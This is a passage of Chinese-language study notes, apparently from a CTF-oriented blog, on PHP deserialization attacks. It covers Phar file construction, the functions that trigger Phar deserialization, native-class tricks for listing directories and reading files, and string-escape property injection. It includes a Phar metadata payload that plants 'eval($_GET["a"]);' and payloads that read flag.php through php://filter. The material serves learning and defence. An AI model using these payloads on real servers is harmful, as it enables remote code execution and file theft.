class="hljs-comment"># 写入stub（是 Phar 文件的入口点，当 Phar 文件被执行时，首先会执行 stub 中的代码）</span><br><span class="hljs-comment"># 括号中的代码是默认的，是一个特殊的 PHP 指令，用于停止 PHP 代码的编译，后面的数据会被当作二进制数据处理</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br><br><span class="hljs-comment"># 要写入文件中的部分</span><br><span class="hljs-comment"># 创建一个 Testobj 类的对象 $o</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Testobj</span>();<br><span class="hljs-comment"># 设置output属性的内容,根据题目改$o</span><br><span class="hljs-variable">$o</span>-&gt;output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;<br><br><span class="hljs-comment"># 调用 setMetadata 方法，将 $o 对象作为元数据写入 Phar 文件中（写入meta-data）</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-comment"># 将字符串 &quot;test&quot; 作为文件内容，以 test.txt 为文件名添加到 Phar 压缩包中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-comment"># 停止写入文件</span><br><span class="hljs-comment"># 调用 stopBuffering 方法，停止缓冲，并将缓冲区中的数据写入到 test.phar 文件中</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-PHAR文件的压缩和解压缩"><a href="#4-PHAR文件的压缩和解压缩" class="headerlink" title="4)PHAR文件的压缩和解压缩"></a>4)PHAR文件的压缩和解压缩</h3><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 压缩</span><br><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;test2.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">buildfromDirectory</span>(<span class="hljs-string">&#x27;f:\0Day&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setDefaultStub</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>Phar类：Phar是 PHP 内置的一个类，用于创建、操作和管理 PHAR 文件</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test2.phar&#x27;</span>,<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;test2.phar&#x27;</span>); <br></code></pre></td></tr></table></figure>
+
+<p>第一个test2.phar是创建的 PHAR 文件名  </p>
+<p> 如果文件不存在会创建一个新的文件，如果文件存在并允许进行修改，会对其进行更新</p>
+<p>0表示文件创建的标志，实际应用中会使用如：Phar::CREATE表示创建新的 PHAR 文件，来指定不同的创建模式</p>
+<p>第二个test2.phar 指定 PHAR 文件的别名，可以在后续中引用该 PHAR 文件时使用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">buildfromDirectory</span>(<span class="hljs-string">&#x27;f:\0Day&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p> 指定要打包的目录路径f:\0Day</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setDefaultStub</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test.txt&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>setDefaultStub用于为PHAR文件设置默认的Stub，即默认入口</p>
+<p>第一个test.txt是入口文件的路径</p>
+<p>第二个test.txt是内部文件的路径</p>
+<h4 id="解压缩"><a href="#解压缩" class="headerlink" title="解压缩"></a>解压缩</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 解压缩</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>通过new Phar(‘test.phar’)语句，程序尝试打开名为test.phar 的Phar压缩包文件</p>
+<p> 并将其封装成一个Phar对象存储在变量$phar中</p>
+<p>  如果文件不存在会报错</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-string">&#x27;test&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>调用Phar对象的extractTo方法</p>
+<p>extractTo方法是将Phar压缩包中的所有内容提取到指定的目录</p>
+<p>参数test是目标目录， 即 Phar 压缩包中的文件和目录会被解压到名为test的目录下</p>
+<p>   如果该目录不存在，PHP 会尝试创建它；若已存在，则会将文件解压到该目录内  </p>
+<h3 id="5-Phar反序列化漏洞原理"><a href="#5-Phar反序列化漏洞原理" class="headerlink" title="5)Phar反序列化漏洞原理"></a>5)Phar反序列化漏洞原理</h3><h6 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a><strong>manifest</strong></h6><p>压缩文件的属性等信息，以序列化存储，存在一段序列化的字符串</p>
+<p>调用phar伪协议，可读取.phar文件</p>
+<p>phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化</p>
+<p>phar需要满足PHP&gt;&#x3D;5.2，在php.ini中将phar.readonly设为Off</p>
+<p>以下是受影响的函数（即可以使用phar伪协议读取.phar文件的函数）</p>
+<p>受影响的函数</p>
+<table>
+<thead>
+<tr>
+<th>fileatinme</th>
+<th>filectime</th>
+<th>file_exists</th>
+<th>file_get_contents</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file_put_contents</td>
+<td>file</td>
+<td>filegroup</td>
+<td>fopen</td>
+</tr>
+<tr>
+<td>fileinode</td>
+<td>filemtime</td>
+<td>fileowner</td>
+<td>fileperms</td>
+</tr>
+<tr>
+<td>is_dir</td>
+<td>is_executable</td>
+<td>is_file</td>
+<td>is_link</td>
+</tr>
+<tr>
+<td>is_readable</td>
+<td>is_wriable</td>
+<td>is_writeable</td>
+<td>parse_ini_file</td>
+</tr>
+<tr>
+<td>copy</td>
+<td>unlink</td>
+<td>stat</td>
+<td>readfile</td>
+</tr>
+</tbody></table>
+<h1 id="PHP原生类利用"><a href="#PHP原生类利用" class="headerlink" title="PHP原生类利用"></a>PHP原生类利用</h1><h2 id="1-目录遍历类"><a href="#1-目录遍历类" class="headerlink" title="1)目录遍历类"></a>1)目录遍历类</h2><h3 id="Directorylterator（查看文件目录）"><a href="#Directorylterator（查看文件目录）" class="headerlink" title="Directorylterator（查看文件目录）"></a>Directorylterator（查看文件目录）</h3><ul>
+<li>条件：PHP5、PHP7、PHP8</li>
+<li>作用：提供了一个简单的接口用来查看文件系统目录的内容，此内置类的__toString方法可以获取字符串形式的文件名，再结合glob:&#x2F;&#x2F;或file:&#x2F;&#x2F;协议，与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，即可实现目录遍历</li>
+<li>这个类会创建一个指定目录的迭代器，当执行到echo时会触发该类中的__toString()方法</li>
+<li>输出指定目录里面经过排序之后的第一个文件名，一般情况第一个文件都是点  .</li>
+<li>搭配foreach可以遍历目录</li>
+</ul>
+<h4 id="配合glob-协议，读取目录"><a href="#配合glob-协议，读取目录" class="headerlink" title="配合glob:&#x2F;&#x2F;协议，读取目录"></a><strong>配合glob:&#x2F;&#x2F;协议，读取目录</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>glob:&#x2F;&#x2F;&#x2F;flag*</p>
+<p>*：用来匹配前四个字母是flag开头的文件名</p>
+<p> 只能返回匹配到的第一个符号的文件名，并不是全部都返回</p>
+<h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p> 提供了一个用于查看文件系统目录内容的简单接口</p>
+<p> 该类的构造方法将会创建一个指定目录的迭代器</p>
+<p>（与DirectoryIterator 类也是基本相同的  </p>
+<h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>这是个自带glob协议的类，所以调用时就不必再加上了glob:&#x2F;&#x2F;</p>
+<p>可以遍历一个文件目录，其行为类似于glob()， 可以通过模式匹配来寻找文件路径。但是使用这个类不需要额外写上glob:&#x2F;&#x2F;</p>
+<p>只需要知道部分名称就可以进行遍历 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&quot;./f*&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="2）文件读取类"><a href="#2）文件读取类" class="headerlink" title="2）文件读取类"></a>2）文件读取类</h2><h3 id="SplFileObject（读文件）"><a href="#SplFileObject（读文件）" class="headerlink" title="SplFileObject（读文件）"></a>SplFileObject（读文件）</h3><p> 当用文件目录遍历到了敏感文件时，可以用类，同样通过echo触发SplFileObject中的__toString()方法</p>
+<p>该类不支持通配符，所以必须先获取SplFileObject到完整文件名称才行</p>
+<p> 只能读取文件的第一行内容  </p>
+<p>如果想要全部读取就需要用到foreach函数，但若题目中没有给出foreach函数的话，就要用伪协议读取文件的内容  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;./flag.php&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>输出为一段base64加密的内容</p>
+<h2 id="3）报错类（可以绕过哈希比较）"><a href="#3）报错类（可以绕过哈希比较）" class="headerlink" title="3）报错类（可以绕过哈希比较）"></a>3）报错类（可以绕过哈希比较）</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>适用版本：php7版本</p>
+<p> Error类就是php的一个内置类用于自动自定义一个Error</p>
+<p>内置方法：__toString()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>类方法</p>
+<ul>
+<li>Error::__construct— 初始化 error 对象</li>
+<li>Error::getMessage— 获取错误信息</li>
+<li>Error::getPrevious— 返回先前的 Throwable</li>
+<li>Error::getCode— 获取错误代码</li>
+<li>Error::getFile—— 获取错误发生时的文件</li>
+<li>Error::getLine — 获取错误发生时的行号</li>
+<li>Error::getTrace— 获取调用栈（stack trace）</li>
+<li>Error::getTraceAsString— 获取字符串形式的调用栈（stack trace）</li>
+<li>Error::__toString — error 的字符串表达</li>
+<li>Error::__clone— 克隆 error</li>
+</ul>
+<h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>适用版本：php5、7、8版本</p>
+<p>与error相似</p>
+<p>类属性</p>
+<ul>
+<li>message：异常消息内容</li>
+<li>code：异常代码</li>
+<li>file：</li>
+</ul>
+<h3 id="Error-Exception-XSS"><a href="#Error-Exception-XSS" class="headerlink" title="Error&#x2F;Exception_XSS"></a>Error&#x2F;Exception_XSS</h3><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="反序列化分隔符"><a href="#反序列化分隔符" class="headerlink" title="反序列化分隔符"></a>反序列化分隔符</h3><p>发序列化以;}结束，后面的字符串不影响正常的反序列化</p>
+<h3 id="属性逃逸"><a href="#属性逃逸" class="headerlink" title="属性逃逸"></a>属性逃逸</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xxxxxi1/p/18809957">https://www.cnblogs.com/xxxxxi1/p/18809957</a></p>
+<p>一般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸</p>
+<h3 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span> = <span class="hljs-string">&quot;abcsystem()system()system()&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v2</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$arga</span>,<span class="hljs-variable">$argc</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;v1 = <span class="hljs-variable">$arga</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;v2 = <span class="hljs-variable">$argc</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>));<span class="hljs-comment">//将传入的v1，v2的值放进A类中然后将A实例化的对象进行序列化</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;system()&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$data</span>);<br><span class="hljs-comment">//将得到的序列化后的字符串中的system()字符替换为空</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-keyword">object</span>(A)<span class="hljs-comment">#1 (2) &#123; [&quot;v1&quot;]=&gt; NULL [&quot;v2&quot;]=&gt; NULL &#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>将代码稍微修改后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span> = <span class="hljs-string">&quot;abcsystem()system()system()&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v2</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$arga</span>,<span class="hljs-variable">$argc</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;v1 = <span class="hljs-variable">$arga</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;v2 = <span class="hljs-variable">$argc</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system()&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;system()&quot;</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>));<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;system()&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出结果：</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">44</span>) <span class="hljs-string">&quot;O:1:&quot;</span>A<span class="hljs-string">&quot;:2:&#123;s:2:&quot;</span>v1<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-string">&quot;;s:2:&quot;</span>v2<span class="hljs-string">&quot;;s:8:&quot;</span><span class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到上面输出的结果中字符串长度时8，但是其实里面是没有字符串的。</p>
+<p>如果进行反序列化的话，是失败的</p>
+<p>但是观察这个字符串</p>
+<p>string(44) “O:1:”A”:2:{s:2:”v1”;s:8:””;s:2:”v2”;s:8:””;}”</p>
+<p>由于长度的读取是按照前面的数字来确定的，不是后面的字符串</p>
+<p>也就是说：</p>
+<p>s:8:”  “;s:2”v2</p>
+<p>一直到v2这个字符这块都是属于v1的字符串的</p>
+<p>如果我们想插入一个v3,删掉v2的话（其实也就是逃逸v3）</p>
+<p>可以看下面这个代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v1</span> = <span class="hljs-string">&quot;abcsystem()system()system()&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v2</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>());<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;system()&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$data</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-string">&quot;O:1:&quot;</span>A<span class="hljs-string">&quot;:2:&#123;s:2:&quot;</span>v1<span class="hljs-string">&quot;;s:27:&quot;</span>abc<span class="hljs-string">&quot;;s:2:&quot;</span>v2<span class="hljs-string">&quot;;s:3:&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用点</p>
+<ul>
+<li>str_replace：将system()替换为空</li>
+<li>str_replace由于是直接替换，并不会改变前面确定字符串长度的数字</li>
+<li>反序列化读取字符串的时候的停止位置 只与前面确定字符串长度的数字有关</li>
+</ul>
+<p> 更改思路</p>
+<ul>
+<li>通过写入system来增大前面确定字符串的</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;v1&quot;</span>;s:？:<span class="hljs-string">&quot;abc&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;v2&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;;s:2:&quot;</span>v3<span class="hljs-string">&quot;:N;&#125;  </span><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="PHP中的GC垃圾回收机制"><a href="#PHP中的GC垃圾回收机制" class="headerlink" title="PHP中的GC垃圾回收机制"></a>PHP中的GC垃圾回收机制</h1><blockquote>
+<p>学习网站：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11289">https://xz.aliyun.com/news/11289</a></p>
+</blockquote>
+<p>在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向<br>时，它就会被变成垃圾，被GC机制自动回收掉<br>那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被GC机制回收，在回收的过程中，它会自动触发_destruct方法，而这也就是我们绕过抛出异常的关键点。</p>
+<h2 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h2><p> 当我们PHP创建一个变量时，这个变量会被存储在一个名为<code>zval</code>的变量容器中。在这个<code>zval</code>变量容器中，不仅包含变量的类型和值，还包含两个字节的额外信息。</p>
+<ul>
+<li>一个字节名为<code>is_ref</code>，是<code>bool</code>值，它用来标识这个变量是否是属于引用集合。PHP引擎通过这个字节来区分普通变量和引用变量，由于PHP允许用户使用<code>&amp;</code>来使用自定义引用，<code>zval</code>变量容器中还有一个内部引用计数机制，来优化内存使用。</li>
+<li>另一个字节是<code>refcount</code>，它用来表示指向<code>zval</code>变量容器的变量个数。所有的符号存储在一个符号表中，其中每个符号都有作用域。</li>
+</ul>
+<p>举例1</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;new string&quot;</span>; <br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment">//用于查看变量a的zval变量容器的内容</span><br><span class="hljs-meta">?&gt;</span> <br><br>a: (refcount=<span class="hljs-number">1</span>, is_ref=<span class="hljs-number">0</span>)=<span class="hljs-string">&#x27;new string&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202330204.png" srcset="/img/loading.gif" lazyload alt="image-20260319202330204"></p>
+<p> 我们可以看到这里定义了一个变量<code>$a</code>，生成了类型为<code>String</code>和值为<code>new string</code>的变量容器，而对于两个额外的字节，<code>is_ref</code>和<code>refcount</code>，我们这里可以看到是不存在引用的，所以<code>is_ref</code>的值应该是false，而<code>refcount</code>是表示变量个数的，那么这里就应该是1 </p>
+<p>举例2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;new string&quot;</span>; <br><span class="hljs-variable">$b</span> =&amp;<span class="hljs-variable">$a</span>;<br><span class="hljs-title function_ invoke__">xdebug_debug_zval</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br>a: (refcount=<span class="hljs-number">2</span>, is_ref=<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;new string&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20260319202333082.png" srcset="/img/loading.gif" lazyload alt="image-20260319202333082"></p>
+<p> 按照之前的思路，每生成一个变量就有一个<code>zval</code>记录其类型和值以及两个额外字节，那我们这里的话a的<code>refcount</code>应该是1，<code>is_ref</code>应该是<code>true</code>，但这里不是， 因为同一变量容器被变量a和变量b关联，当没必要时,php不会去复制已生成的变量容器。<br>所以这一个<code>zval</code>容器存储了<code>a</code>和<code>b</code>两个变量，就使得<code>refcount</code>的值为2. </p>
+<h3 id="创建变量"><a href="#创建变量" class="headerlink" title="创建变量"></a>创建变量</h3><p>在 PHP 中，所有变量（无论类型）在底层都被封装为一个zval结构体，用于存储变量的值、类型以及内存管理相关的元数据，其中有两个字节</p>
+<p>refcount：表示当前有多少个变量（或符号）引用这个zval结构体</p>
+<p>is_ref：时bool值，表示改变量是否通过&amp;被显示标记为引用（PHP引通过这个字节来区分普通变量和引用变量，PHP允许用户使用&amp;来使用自定义引用）</p>
+<p>当is_ref&#x3D;1时，表示该zval处于”引用模式“，所有指向它的变量都是引用关系（共享同一份数据，修改会相互影响）；</p>
+<p>当is_ref&#x3D;1时，表示该zval处于”普通模式“，变量间是独立引用（修改一个不会影响另一个，除非触发写时复制）</p>
